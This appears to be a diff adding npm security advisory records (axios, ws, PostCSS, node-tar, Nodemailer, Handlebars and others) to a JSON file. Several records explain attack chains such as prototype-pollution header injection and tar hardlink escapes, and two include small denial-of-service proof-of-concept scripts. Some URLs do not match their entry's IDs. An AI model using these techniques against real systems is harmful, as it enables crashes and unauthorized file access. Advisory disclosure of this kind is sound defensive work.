+  "details": "### Summary\ntoFormData recursively walks nested objects with no depth limit, so a deeply nested value passed as request data crashes the Node.js process with a RangeError.\n\n### Details\nlib/helpers/toFormData.js:210 defines an inner `build(value, path)` that recurses into every object/array child (line 225: `build(el, path ? path.concat(key) : [key])`). The only safeguard is a `stack` array used to detect circular references; there is no maximum depth and no try/catch around the recursion. Because `build` calls itself once per nesting level, a payload nested roughly 2000+ levels deep exhausts V8's call stack.\n\n`toFormData` is the serializer behind `FormData` request bodies and `AxiosURLSearchParams` (used by `buildURL` when `params` is an object with `URLSearchParams` unavailable, see `lib/helpers/buildURL.js:53` and `lib/helpers/AxiosURLSearchParams.js:36`). Any server-side code that forwards a client-supplied object into `axios({ data, params })` therefore reaches the recursive walker with attacker-controlled depth.\n\nThe RangeError is thrown synchronously from inside `forEach`, escapes `toFormData`, and propagates out of the axios request call. In typical Express/Fastify request h",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-42039"
+  ],
+  "published": "2026-05-05T00:34:32Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-42039",
+  "fixed": [
+   "axios@1.15.1",
+   "axios@0.31.1"
+  ]
+ },
+ {
+  "id": "GHSA-6chq-wfr3-2hj9",
+  "summary": "Axios: Header Injection via Prototype Pollution",
+  "details": "### Summary\n\nA prototype pollution gadget exists in the Axios HTTP adapter (lib/adapters/http.js) that allows an attacker to inject arbitrary HTTP headers into outgoing requests. The vulnerability exploits duck-type checking of the data payload, where if Object.prototype is polluted with getHeaders, append, pipe, on, once, and Symbol.toStringTag, Axios misidentifies any plain object payload as a FormData instance and calls the attacker-controlled getHeaders() function, merging the returned headers into the outgoing request.\n\nThe vulnerable code resides exclusively in lib/adapters/http.js. The prototype pollution source does not need to originate from Axios itself — any prototype pollution primitive in any dependency in the application's dependency tree is sufficient to trigger this gadget.\n\nPrerequisites:\n\nA prototype pollution primitive must exist somewhere in the application's dependency chain (e.g., via lodash.merge, qs, JSON5, or any deep-merge utility processing attacker-controlled input). The pollution source is not required to be in Axios.\nThe application must use Axios to make HTTP requests with a data payload (POST, PUT, PATCH).\n\n### Details\n\nThe vulnerability is in `lib/a",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-42035"
+  ],
+  "published": "2026-05-05T00:25:47Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-42035",
+  "fixed": [
+   "axios@1.15.1",
+   "axios@0.31.1"
+  ]
+ },
+ {
+  "id": "GHSA-6fc8-4gx4-v693",
+  "summary": "ReDoS in Sec-Websocket-Protocol header",
+  "details": "### Impact\n\nA specially crafted value of the `Sec-Websocket-Protocol` header can be used to significantly slow down a ws server.\n\n### Proof of concept\n\n```js\nfor (const length of [1000, 2000, 4000, 8000, 16000, 32000]) {\n  const value = 'b' + ' '.repeat(length) + 'x';\n  const start = process.hrtime.bigint();\n\n  value.trim().split(/ *, */);\n\n  const end = process.hrtime.bigint();\n\n  console.log('length = %d, time = %f ns', length, end - start);\n}\n```\n\n### Patches\n\nThe vulnerability was fixed in ws@7.4.6 (https://github.com/websockets/ws/commit/00c425ec77993773d823f018f64a5c44e17023ff) and backported to ws@6.2.2 (https://github.com/websockets/ws/commit/78c676d2a1acefbc05292e9f7ea0a9457704bf1b) and ws@5.2.3 (https://github.com/websockets/ws/commit/76d47c1479002022a3e4357b3c9f0e23a68d4cd2).\n\n### Workarounds\n\nIn vulnerable versions of ws, the issue can be mitigated by reducing the maximum allowed length of the request headers using the [`--max-http-header-size=size`](https://nodejs.org/api/cli.html#cli_max_http_header_size_size) and/or the [`maxHeaderSize`](https://nodejs.org/api/http.html#http_http_createserver_options_requestlistener) options.\n\n### Credits\n\nThe vulnerability was respo",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2021-32640"
+  ],
+  "published": "2021-05-28T19:19:03Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-32640",
+  "fixed": [
+   "ws@7.4.6",
+   "ws@6.2.2",
+   "ws@5.2.3"
+  ]
+ },
+ {
+  "id": "GHSA-6g55-p6wh-862q",
+  "summary": "PostCSS: Arbitrary file read and information disclosure via attacker-controlled sourceMappingURL in CSS comments",
+  "details": "## Summary\n\nPostCSS's `PreviousMap` parses the `/*# sourceMappingURL=PATH */` comment from any CSS string passed to `process()` and dereferences `PATH` against the local filesystem with no scheme, allowlist, or traversal check. An attacker who controls the CSS input can cause the host process to read any file readable by Node and leak the first ~10 bytes of its content through the resulting `JSON.parse` `SyntaxError` message. The bug also yields a precise file-existence oracle and a controllable-read primitive that may be combined with large-file targets for DoS. The behaviour is triggered with PostCSS's default options — no `from`, no `map`, no plugins required — and is therefore reachable from any pipeline that runs untrusted CSS through PostCSS (CMS themes, user-uploaded styles, browser-extension/userstyle processors, build pipelines for third-party packages, blog comment renderers, etc.).\n\n## Details\n\nThe dangerous chain lives in `lib/previous-map.js` and is wired into every `Input` construction at `lib/input.js:70-77`.\n\n`Input` constructor (`lib/input.js:70-77`):\n\n```js\nif (pathAvailable && sourceMapAvailable) {\n  let map = new PreviousMap(this.css, opts)\n  if (map.text) {\n   ",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-45623"
+  ],
+  "published": "2026-07-23T15:06:16Z",
+  "url": "https://osv.dev/vulnerability/GHSA-6g55-p6wh-862q",
+  "fixed": [
+   "postcss@8.5.12"
+  ]
+ },
+ {
+  "id": "GHSA-6rw7-vpxm-498p",
+  "summary": "qs's arrayLimit bypass in its bracket notation allows DoS via memory exhaustion",
+  "details": "### Summary\n\nThe `arrayLimit` option in qs did not enforce limits for bracket notation (`a[]=1&a[]=2`), only for indexed notation (`a[0]=1`). This is a consistency bug; `arrayLimit` should apply uniformly across all array notations.\n\n**Note:** The default `parameterLimit` of 1000 effectively mitigates the DoS scenario originally described. With default options, bracket notation cannot produce arrays larger than `parameterLimit` regardless of `arrayLimit`, because each `a[]=value` consumes one parameter slot. The severity has been reduced accordingly.\n\n### Details\n\nThe `arrayLimit` option only checked limits for indexed notation (`a[0]=1&a[1]=2`) but did not enforce it for bracket notation (`a[]=1&a[]=2`).\n\n**Vulnerable code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = utils.combine([], leaf);  // No arrayLimit check\n}\n```\n\n**Working code** (`lib/parse.js:175`):\n```javascript\nelse if (index <= options.arrayLimit) {  // Limit checked here\n    obj = [];\n    obj[index] = leaf;\n}\n```\n\nThe bracket notation handler at line 159 uses `utils.combine([], leaf)` without validating against `options.arrayLimit`, while indexed notation at line 17",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2025-15284"
+  ],
+  "published": "2025-12-30T21:02:54Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-15284",
+  "fixed": [
+   "qs@6.14.1"
+  ]
+ },
+ {
+  "id": "GHSA-6vj9-mwq6-2f5v",
+  "summary": "Nodemailer: Process-global DNS cache reuses TLS `servername` across transports, enabling cross-tenant SMTP credential disclosure",
+  "details": "### Summary\n\nNodemailer's process-global DNS cache is keyed only by `host`, but each cache entry also stores the caller-specific TLS `servername`. When two direct SMTPS transports use the same DNS host with different `tls.servername` values, the first transport's server name is returned to the second transport and overwrites its explicitly configured value.\n\nAs a result, Nodemailer sends the wrong SNI value and verifies the peer certificate against the wrong identity. In a multi-tenant service or SNI-routed SMTP gateway, one tenant can prime the cache so that a victim transport connects to the attacker's TLS virtual host, accepts the attacker's certificate with `rejectUnauthorized: true`, and sends the victim's SMTP credentials to it.\n\n## Affected component\n\n- **Ecosystem:** npm\n- **Package:** `nodemailer`\n- **Repository:** https://github.com/nodemailer/nodemailer\n- **Tested version:** `10.0.1`\n- **Tested commit:** `40d52215aac65b811d7e131bc916f68605efd9d2`\n- **Runtime-confirmed vulnerable versions:** `5.0.0` and `10.0.1`\n- **Affected versions:** `>= 5.0.0, <= 10.0.1`\n- **Patched versions:** None known at the time of this report\n- **Affected mode:** Direct TLS/SMTPS connections (`s",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-100701"
+  ],
+  "published": "2026-09-28T21:56:05Z",
+  "url": "https://osv.dev/vulnerability/GHSA-6vj9-mwq6-2f5v",
+  "fixed": [
+   "nodemailer@10.0.2"
+  ]
+ },
+ {
+  "id": "GHSA-72xf-g2v4-qvf3",
+  "summary": "tough-cookie Prototype Pollution vulnerability",
+  "details": "Versions of the package tough-cookie before 4.1.3 are vulnerable to Prototype Pollution due to improper handling of Cookies when using CookieJar in `rejectPublicSuffixes=false` mode. This issue arises from the manner in which the objects are initialized.",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2023-26136"
+  ],
+  "published": "2023-07-01T06:30:16Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-26136",
+  "fixed": [
+   "tough-cookie@4.1.3"
+  ]
+ },
+ {
+  "id": "GHSA-765h-qjxv-5f44",
+  "summary": "Prototype Pollution in handlebars",
+  "details": "The package handlebars before 4.7.7 are vulnerable to Prototype Pollution when selecting certain compiling options to compile templates coming from an untrusted source.",
+  "severity": "CRITICAL",
+  "aliases": [
+   "CVE-2021-23383"
+  ],
+  "published": "2022-02-10T23:51:42Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-23383",
+  "fixed": [
+   "handlebars@4.7.7"
+  ]
+ },
+ {
+  "id": "GHSA-776f-qx25-q3cc",
+  "summary": "xml2js is vulnerable to prototype pollution",
+  "details": "xml2js versions before 0.5.0 allows an external attacker to edit or add new properties to an object. This is possible because the application does not properly validate incoming JSON keys, thus allowing the `__proto__` property to be edited.",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2023-0842"
+  ],
+  "published": "2023-04-05T21:30:24Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-0842",
+  "fixed": [
+   "xml2js@0.5.0"
+  ]
+ },
+ {
+  "id": "GHSA-7fh5-64p2-3v2j",
+  "summary": "PostCSS line return parsing error",
+  "details": "An issue was discovered in PostCSS before 8.4.31. It affects linters using PostCSS to parse external Cascading Style Sheets (CSS). There may be `\\r` discrepancies, as demonstrated by `@font-face{ font:(\\r/*);}` in a rule.\n\nThis vulnerability affects linters using PostCSS to parse external untrusted CSS. An attacker can prepare CSS in such a way that it will contains parts parsed by PostCSS as a CSS comment. After processing by PostCSS, it will be included in the PostCSS output in CSS nodes (rules, properties) despite being originally included in a comment.",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2023-44270"
+  ],
+  "published": "2023-09-30T00:31:10Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-44270",
+  "fixed": [
+   "postcss@8.4.31"
+  ]
+ },
+ {
+  "id": "GHSA-7gfc-8cq8-jh5f",
+  "summary": "Next.js authorization bypass vulnerability",
+  "details": "### Impact\nIf a Next.js application is performing authorization in middleware based on pathname, it was possible for this authorization to be bypassed.\n\n### Patches\nThis issue was patched in Next.js `14.2.15` and later.\n\nIf your Next.js application is hosted on Vercel, this vulnerability has been automatically mitigated, regardless of Next.js version.\n\n### Workarounds\nThere are no official workarounds for this vulnerability.\n\n#### Credits\nWe'd like to thank [tyage](http://github.com/tyage) (GMO CyberSecurity by IERAE) for responsible disclosure of this issue.",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2024-51479"
+  ],
+  "published": "2024-12-17T15:09:06Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-51479",
+  "fixed": [
+   "next@14.2.15"
+  ]
+ },
+ {
+  "id": "GHSA-7q8q-rj6j-mhjq",
+  "summary": "Axios: Nested axios option objects can consume polluted prototype values",
+  "details": "## Summary\n\nAxios can consume inherited properties from nested request option objects when the JavaScript process already has a polluted `Object.prototype`.\n\nThe top-level merged config is protected with a null prototype, but nested plain objects such as `auth` and `paramsSerializer` are cloned into ordinary objects. If application code passes placeholders such as `auth: {}` or `paramsSerializer: {}`, inherited `username`, `password`, `encode`, or `serialize` properties can influence outbound requests.\n\n## Impact\n\nThis is reachable only when another component has already polluted `Object.prototype` and the application passes an affected nested axios option object.\n\nConfirmed impacts include silent injection of an `Authorization: Basic ...` header from inherited `username` and `password` values, and query-string tampering when inherited `paramsSerializer` fields are function-valued.\n\nThe `auth` case requires only string-valued pollution. Full query-string replacement through `paramsSerializer.serialize` requires a function-valued pollution primitive; string-only pollution may still cause request failures or encoding changes through `encode`.\n\nThis does not mean every axios request i",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-67319"
+  ],
+  "published": "2026-07-20T22:37:31Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-67319",
+  "fixed": [
+   "axios@0.33.0",
+   "axios@1.18.0"
+  ]
+ },
+ {
+  "id": "GHSA-7rx3-28cr-v5wh",
+  "summary": "Handlebars.js has a Prototype Method Access Control Gap via Missing __lookupSetter__ Blocklist Entry",
+  "details": "## Summary\n\nThe prototype method blocklist in `lib/handlebars/internal/proto-access.js` blocks `constructor`, `__defineGetter__`, `__defineSetter__`, and `__lookupGetter__`, but omits the symmetric `__lookupSetter__`. This omission is only exploitable when the non-default runtime option `allowProtoMethodsByDefault: true` is explicitly set — in that configuration `__lookupSetter__` becomes accessible while its counterparts remain blocked, creating an inconsistent security boundary.\n\n`4.6.0` is the version that introduced `protoAccessControl` and the `allowProtoMethodsByDefault` runtime option.\n\n## Description\n\nIn `lib/handlebars/internal/proto-access.js`:\n\n```javascript\nconst methodWhiteList = Object.create(null);\nmethodWhiteList['constructor']      = false;\nmethodWhiteList['__defineGetter__'] = false;\nmethodWhiteList['__defineSetter__'] = false;\nmethodWhiteList['__lookupGetter__'] = false;\n// __lookupSetter__ intentionally blocked in CVE-2021-23383,\n// but omitted here — creating an asymmetric blocklist\n```\n\nAll four legacy accessor helpers (`__defineGetter__`, `__defineSetter__`, `__lookupGetter__`, `__lookupSetter__`) were involved in the exploit chain addressed by CVE-2021-23383",
+  "severity": "MODERATE",
+  "aliases": [],
+  "published": "2026-03-29T15:17:15Z",
+  "url": "https://github.com/advisories/GHSA-765h-qjxv-5f44",
+  "fixed": [
+   "handlebars@4.7.9"
+  ]
+ },
+ {
+  "id": "GHSA-83g3-92jg-28cx",
+  "summary": "Arbitrary File Read/Write via Hardlink Target Escape Through Symlink Chain in node-tar Extraction",
+  "details": "### Summary\n`tar.extract()` in Node `tar` allows an attacker-controlled archive to create a hardlink inside the extraction directory that points to a file outside the extraction root, using default options.\n\nThis enables **arbitrary file read and write** as the extracting user (no root, no chmod, no `preservePaths`).\n\nSeverity is high because the primitive bypasses path protections and turns archive extraction into a direct filesystem access primitive.\n\n### Details\nThe bypass chain uses two symlinks plus one hardlink:\n\n1. `a/b/c/up -> ../..`\n2. `a/b/escape -> c/up/../..`\n3. `exfil` (hardlink) -> `a/b/escape/<target-relative-to-parent-of-extract>`\n\nWhy this works:\n\n- Linkpath checks are string-based and do not resolve symlinks on disk for hardlink target safety.\n  - See `STRIPABSOLUTEPATH` logic in:\n    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:255`\n    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:268`\n    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:281`\n\n- Hardlink extraction resolves target as `path.resolve(cwd, entry.linkpath)` and then calls `fs.link(target, destination)`.\n  - `../tar-audit-setuid - C",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-26960"
+  ],
+  "published": "2026-02-18T00:57:13Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-26960",
+  "fixed": [
+   "tar@7.5.8"
+  ]
+ },
+ {
+  "id": "GHSA-848j-6mx2-7j84",
+  "summary": "Elliptic Uses a Cryptographic Primitive with a Risky Implementation",
+  "details": "The ECDSA implementation of the Elliptic package generates incorrect signatures if an interim value of 'k' (as computed based on step 3.2 of  RFC 6979 https://datatracker.ietf.org/doc/html/rfc6979 ) has leading zeros and is susceptible to cryptanalysis, which can lead to secret key exposure. This happens, because the byte-length of 'k' is incorrectly computed, resulting in its getting truncated during the computation. Legitimate transactions or communications will be broken as a result. Furthermore, due to the nature of the fault, attackers could–under certain conditions–derive the secret key, if they could get their hands on both a faulty signature generated by a vulnerable version of Elliptic and a correct signature for the same inputs.\n\nThis issue affects all known versions of Elliptic (at the time of writing, versions less than or equal to 6.6.1).",
+  "severity": "LOW",
+  "aliases": [
+   "CVE-2025-14505"
+  ],
+  "published": "2026-01-08T21:30:34Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-14505",
+  "fixed": []
+ },
+ {
+  "id": "GHSA-898c-q2cr-xwhg",
+  "summary": "axios has DoS & Header Injection via Prototype Pollution Read-Side Gadgets in axios merge functions",
+  "details": "## Summary\n\naxios `1.15.2` exposes two read-side prototype-pollution gadgets. When `Object.prototype` is polluted by an upstream dependency in the same process (e.g. lodash `_.merge` / [CVE-2018-16487](https://nvd.nist.gov/vuln/detail/CVE-2018-16487)), axios silently picks up the polluted values:\n\n1. **Header injection** - `lib/utils.js` line 406 builds `merge()`'s accumulator as `result = {}`, so `result[targetKey]` (line 414) walks `Object.prototype` and the polluted bucket's own keys are copied into the merged headers and ride out on the wire.\n2. **Crash DoS** - `lib/core/mergeConfig.js` line 26 builds the `hasOwnProperty` descriptor as a plain-object literal. `Object.defineProperty` reads `descriptor.get`/`descriptor.set` via the prototype chain, so a polluted `Object.prototype.get` or `Object.prototype.set` makes the call throw `TypeError` synchronously on every axios request.\n\n## Affected Properties\n\n| Polluted slot | Effect |\n|---|---|\n| `Object.prototype.common` | injects headers on every method |\n| `Object.prototype.delete` / `.head` / `.post` / `.put` / `.patch` / `.query` | injects headers on the matching method |\n| `Object.prototype.get` | every axios request throws `Ty",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-44490"
+  ],
+  "published": "2026-05-29T15:54:57Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-16487",
+  "fixed": [
+   "axios@1.16.0",
+   "axios@0.32.0"
+  ]
+ },
+ {
+  "id": "GHSA-8cf7-32gw-wr33",
+  "summary": "jsonwebtoken unrestricted key type could lead to legacy keys usage ",
+  "details": "# Overview\n\nVersions `<=8.5.1` of `jsonwebtoken` library could be misconfigured so that legacy, insecure key types are used for signature verification. For example, DSA keys could be used with the RS256 algorithm. \n\n# Am I affected?\n\nYou are affected if you are using an algorithm and a key type other than the combinations mentioned below\n\n| Key type |  algorithm                                    |\n|----------|------------------------------------------|\n| ec           | ES256, ES384, ES512                      |\n| rsa          | RS256, RS384, RS512, PS256, PS384, PS512 |\n| rsa-pss  | PS256, PS384, PS512                      |\n\nAnd for Elliptic Curve algorithms:\n\n| `alg` | Curve      |\n|-------|------------|\n| ES256 | prime256v1 |\n| ES384 | secp384r1  |\n| ES512 | secp521r1  |\n\n# How do I fix it?\n\nUpdate to version 9.0.0. This version validates for asymmetric key type and algorithm combinations. Please refer to the above mentioned algorithm / key type combinations for the valid secure configuration. After updating to version 9.0.0, If you still intend to continue with signing or verifying tokens using invalid key type/algorithm value combinations, you’ll need to set the `allowInvalid",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2022-23539"
+  ],
+  "published": "2022-12-22T03:32:22Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23539",
+  "fixed": [
+   "jsonwebtoken@9.0.0"
+  ]
+ },
+ {
+  "id": "GHSA-8hfj-j24r-96c4",
+  "summary": "Path Traversal: 'dir/../../filename' in moment.locale",
+  "details": "### Impact\nThis vulnerability impacts npm (server) users of moment.js, especially if user provided locale string, eg `fr` is directly used to switch moment locale.\n\n### Patches\nThis problem is patched in 2.29.2, and the patch can be applied to all affected versions (from 1.0.1 up until 2.29.1, inclusive).\n\n### Workarounds\nSanitize user-provided locale name before passing it to moment.js.\n\n### References\n_Are there any links users can visit to find out more?_\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [moment repo](https://github.com/moment/moment)",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2022-24785"
+  ],
+  "published": "2022-04-04T21:25:48Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24785",
+  "fixed": [
+   "moment@2.29.2",
+   "Moment.js@2.29.2"
+  ]
+ },
+ {
+  "id": "GHSA-8m3c-c648-2xjj",
+  "summary": "Nodemailer: resolveContent() on a MailMessage bypasses disableFileAccess/disableUrlAccess when called with the legacy signature",
+  "details": "### Summary\n\nNodemailer's `disableFileAccess` / `disableUrlAccess` options are a security sandbox that lets an application forbid untrusted message content (`html`/`text`/attachment `path`/`href`) from reading local files or making outbound HTTP(S) requests. The fix for GHSA-wqvq-jvpq-h66f (commit `5f69497`) threaded these flags through the library's internal resolution paths (`MailMessage.resolveAll()` and `_convertDataImages()`), but the public plugin API `MailMessage.resolveContent(...args)` (`lib/mailer/mail-message.js:41-43`) remains a raw passthrough to `shared.resolveContent()`.\n\nWhen called with the documented legacy signature `mail.resolveContent(data, key, callback)`, `shared.resolveContent` normalizes the missing options argument to an empty object (`options = options || {}`, `lib/shared/index.js:530`). The message-level flags that the `MailMessage` constructor already copied into `mail.data` (`lib/mailer/mail-message.js:34-38`) are silently discarded, so `resolveContentValue` skips both access-control guards and reaches `nmfetch(url)` (SSRF, `lib/shared/index.js:588`) or `fs.createReadStream(path)` (arbitrary file read, `lib/shared/index.js:597`).\n\nA plugin or applicati",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-92595"
+  ],
+  "published": "2026-09-08T21:16:00Z",
+  "url": "https://osv.dev/vulnerability/GHSA-8m3c-c648-2xjj",
+  "fixed": [
+   "nodemailer@9.1.1"
+  ]
+ },
+ {
+  "id": "GHSA-8qq5-rm4j-mr97",
+  "summary": "node-tar is Vulnerable to Arbitrary File Overwrite and Symlink Poisoning via Insufficient Path Sanitization",
+  "details": "### Summary\n\nThe `node-tar` library (`<= 7.5.2`) fails to sanitize the `linkpath` of `Link` (hardlink) and `SymbolicLink` entries when `preservePaths` is false (the default secure behavior). This allows malicious archives to bypass the extraction root restriction, leading to **Arbitrary File Overwrite** via hardlinks and **Symlink Poisoning** via absolute symlink targets.\n\n### Details\n\nThe vulnerability exists in `src/unpack.ts` within the `[HARDLINK]` and `[SYMLINK]` methods.\n\n**1. Hardlink Escape (Arbitrary File Overwrite)**\n\nThe extraction logic uses `path.resolve(this.cwd, entry.linkpath)` to determine the hardlink target. Standard Node.js behavior dictates that if the second argument (`entry.linkpath`) is an **absolute path**, `path.resolve` ignores the first argument (`this.cwd`) entirely and returns the absolute path.\n\nThe library fails to validate that this resolved target remains within the extraction root. A malicious archive can create a hardlink to a sensitive file on the host (e.g., `/etc/passwd`) and subsequently write to it, if file permissions allow writing to the target file, bypassing path-based security measures that may be in place.\n\n**2. Symlink Poisoning**\n\nTh",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-23745"
+  ],
+  "published": "2026-01-16T21:16:20Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-23745",
+  "fixed": [
+   "tar@7.5.3"
+  ]
+ },
+ {
+  "id": "GHSA-8r5x-fm3f-whwj",
+  "summary": "Handlebars: JavaScript Injection via AST Type Confusion in compile (bypass of CVE-2026-33937)",
+  "details": "## Summary\n\n`Handlebars.compile()` and `Handlebars.precompile()` accept a pre-parsed AST as well as a template string. Handlebars 4.7.9 added validation for such ASTs. It only checks values on `PathExpression`, `NumberLiteral` and `BooleanLiteral` nodes, and the compiler still writes several other AST values into the generated JavaScript unchecked.\n\nIf an application passes an untrusted object to `compile()` or `precompile()`, such as a parsed JSON request body, that object can carry arbitrary JavaScript. With `compile()`, the code runs on the server when the template renders. With `precompile()`, it ends up in the precompiled output and runs wherever that output is loaded.\n\nApplications that only ever pass template **strings** are not affected.\n\nThis bypasses the AST validation added in 4.7.9 for GHSA-2w6w-674q-4c4q, GHSA-xhpv-hc6g-r9c6 and GHSA-3mfm-83xf-c92r.\n\n## Details\n\nThe 4.7.9 validator runs in `parseWithoutProcessing()` and walks the whole AST. It only checks values on nodes whose `type` is `PathExpression`, `NumberLiteral` or `BooleanLiteral`. It passes over plain objects without a `type`, and over strings and other non-object values. The compiler reads these values from ",
+  "severity": "CRITICAL",
+  "aliases": [
+   "CVE-2026-106446"
+  ],
+  "published": "2026-10-08T17:52:32Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-106446",
+  "fixed": [
+   "handlebars@4.7.10"
+  ]
+ },
+ {
+  "id": "GHSA-8vvx-rff5-p5rq",
+  "summary": "Nodemailer: Nested structured recipient arrays bypass the parser depth limit and cause stack exhaustion DoS",
+  "details": "## Submission metadata\n\n| Field | Value |\n|---|---|\n| Ecosystem | npm |\n| Package | `nodemailer` |\n| Repository | https://github.com/nodemailer/nodemailer |\n| Tested commit | `40d52215aac65b811d7e131bc916f68605efd9d2` |\n| Current tested version | `10.0.1` |\n| Confirmed vulnerable versions | `2.7.2`, `3.0.0`, `7.0.11`, `9.1.1`, `10.0.1` |\n| Proposed affected range | `>= 2.7.2, <= 10.0.1` |\n| Patched version | 10.0.2 |\n\n## Summary\n\nNodemailer 10.0.1 does not safely process deeply nested arrays supplied through recipient fields such as `to`, `cc`, and `bcc`.\n\nThe public `MimeNodeAddressInput` type recursively permits arrays, but `MimeNode._parseAddresses()` flattens only the outermost array. A remaining nested array is passed to `addressparser()`, whose `Tokenizer` coerces the input with `.toString()`. Native `Array.prototype.toString()` recursively processes every nested array through `join()` and `toString()` until the V8 call stack is exhausted.\n\nA valid 10,021-byte JSON recipient value containing one address wrapped in 5,000 arrays causes:\n\n```text\nRangeError: Maximum call stack size exceeded\n```\n\nThe exception occurs through the normal `sendMail()` API before the `maxRecipients` ",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2026-100702"
+  ],
+  "published": "2026-09-29T18:23:50Z",
+  "url": "https://osv.dev/vulnerability/GHSA-8vvx-rff5-p5rq",
+  "fixed": [
+   "nodemailer@10.0.2"
+  ]
+ },
+ {
+  "id": "GHSA-8x88-c5mf-7j5w",
+  "summary": "node-tar: Negative tar entry size causes infinite loop in archive replace",
+  "details": "### Summary\n\nA checksum-valid tar archive with a negative base-256 encoded entry size can make `tar.replace()` loop forever while scanning the existing archive. Applications that update attacker-controlled tar archives can have a worker process pinned indefinitely, causing denial of service.\n\n### Details\n\nThe public `tar.replace()` API scans the existing archive before appending replacement entries. During this scan, it parses each tar header and advances the archive position by the parsed entry size rounded to a 512-byte block boundary.\n\nTar supports base-256 encoded numeric fields. A crafted header can encode the entry size as `-512` while still carrying a valid checksum. The replace scan accepts that parsed negative size and uses it in the position-advance calculation.\n\nFor a size of `-512`, the computed body skip is `-512`. The scan then adds the normal 512-byte header step, resulting in no net progress. The scanner repeatedly parses the same header forever and never reaches the append step.\n\nThis is reachable through the supported package API when the existing archive file is attacker controlled. It does not rely on extraction, dependency behavior, or an uncaught exception.\n\n#",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-59874"
+  ],
+  "published": "2026-07-20T21:51:39Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-59874",
+  "fixed": [
+   "tar@7.5.18"
+  ]
+ },
+ {
+  "id": "GHSA-952p-6rrq-rcjv",
+  "summary": "Regular Expression Denial of Service (ReDoS) in micromatch",
+  "details": "The NPM package `micromatch` prior to version 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn't find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persisted prior to https://github.com/micromatch/micromatch/pull/266. This issue should be mitigated by using a safe pattern that won't start backtracking the regular expression due to greedy matching.\n",
+  "severity": "MODERATE",
+  "aliases": [
+   "CVE-2024-4067"
+  ],
+  "published": "2024-05-14T18:30:54Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-4067",
+  "fixed": [
+   "micromatch@4.0.8"
+  ]
+ },
+ {
+  "id": "GHSA-96hv-2xvq-fx4p",
+  "summary": "ws: Memory exhaustion DoS from tiny fragments and data chunks",
+  "details": "### Impact\n\nA high volume of exceptionally small fragments and data chunks can be sent by a peer, with modest network traffic, to force the remote peer into allocating and holding structural wrappers that consume far more memory than the default documented message-size limit, leading to process termination due to OOM.\n\n### Proof of concept\n\n```js\nimport { WebSocket, WebSocketServer } from 'ws';\n\nconst wss = new WebSocketServer({ port: 0 }, function () {\n  const data = Buffer.alloc(1);\n  const options = { fin: false };\n  const { port } = wss.address();\n  const ws = new WebSocket(`ws://localhost:${port}`);\n\n  ws.on('open', function () {\n    (function send() {\n      ws.send(data, options, function (err) {\n        if (err) return;\n        send();\n      });\n    })();\n  });\n\n  ws.on('error', console.error);\n  ws.on('close', function (code, reason) {\n    console.log(`client close - code: ${code} reason: ${reason.toString()}`);\n  });\n});\n\nwss.on('connection', function (ws) {\n  ws.on('error', console.error);\n  ws.on('close', function (code, reason) {\n    console.log(`server close - code: ${code} reason: ${reason.toString()}`);\n  });\n});\n```\n\n### Patches\n\nThe vulnerability was fixed in ws@8.",
+  "severity": "HIGH",
+  "aliases": [
+   "CVE-2026-48779"
+  ],
+  "published": "2026-06-15T16:34:23Z",
+  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-48779",
+  "fixed": [
+   "ws@5.2.5",
+   "ws@6.2.4",
+   "ws@7.5.11",
+   "ws@8.21.0"
+  ]
+ },
+ {
+  "id": "GHSA-9cx6-37pm-9jff",
+  "summary": "Handlebars.js has Denial of Service via Malformed Decorator Syntax in Template Compilation",
